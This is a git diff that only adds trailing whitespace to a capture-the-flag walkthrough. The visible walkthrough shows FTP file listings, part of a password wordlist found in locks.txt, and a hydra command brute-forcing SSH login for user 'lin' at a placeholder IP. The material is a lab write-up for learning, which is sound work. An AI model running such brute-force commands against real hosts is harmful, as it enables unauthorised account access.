@@ -49,7 +49,7 @@ drwxr-xr-x    2 ftp      ftp          4096 Jun 07 21:47 ..
 226 Directory send OK.
 ftp> 
 ```
-- locks.txt
+- locks.txt   
 locks.txt contains a wordlist that can help us to get user access.
 ```bash
 $ cat locks.txt 
@@ -80,7 +80,7 @@ rEDdrAGOnSyNDiCat3
 r3ddr@g0N
 ReDSynd1ca7e
 ```
-- task.txt
+- task.txt   
 task.txt contains list of tasks to do written by 'lin'.
 ```bash
 $ cat task.txt
@@ -92,7 +92,7 @@ $ cat task.txt
 ```
 So, from this point, we have potential user and wordlist to bruteforce ssh login.   
 
-## Bruteforcing Login
+## Bruteforcing Login   
 Let's power up hydra and get in!   
 ```bash
 $ hydra -l lin -P ftp/locks.txt <IP_ADDRESS> ssh
